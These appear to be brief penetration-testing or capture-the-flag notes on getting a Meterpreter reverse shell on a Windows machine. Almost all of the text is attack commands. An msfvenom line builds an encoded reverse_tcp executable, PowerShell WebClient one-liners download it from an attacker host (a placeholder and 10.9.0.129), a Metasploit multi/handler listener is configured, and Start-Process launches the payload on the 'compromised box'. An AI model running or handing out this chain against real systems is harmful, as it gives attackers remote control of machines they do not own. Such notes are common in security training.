We first create a meterpreter payload

```msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe```

---

We can then download the payload from the compromised box:
`powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`



`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.129:80/pload.exe','pload.exe')"`

---

We need to set up a multi handler listener on metasploit first
`use exploit/multi/handler`
`set PAYLOAD windows/meterpreter/reverse_tcp`
set lhost, lport

---

We can now run the payload on the compromised box
`Start-Process "pload.exe"`


